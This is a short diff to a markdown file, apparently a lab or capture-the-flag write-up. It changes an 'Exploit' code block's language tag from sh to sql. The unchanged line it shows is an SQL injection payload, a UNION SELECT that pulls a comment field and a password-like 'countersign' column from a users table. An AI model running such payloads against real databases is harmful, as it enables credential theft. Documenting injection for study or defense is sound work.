@@ -2,7 +2,7 @@
 
 ## Exploit
 
-```sh
+```sql
 1 UNION SELECT commentaire, countersign FROM users --
 ```
 
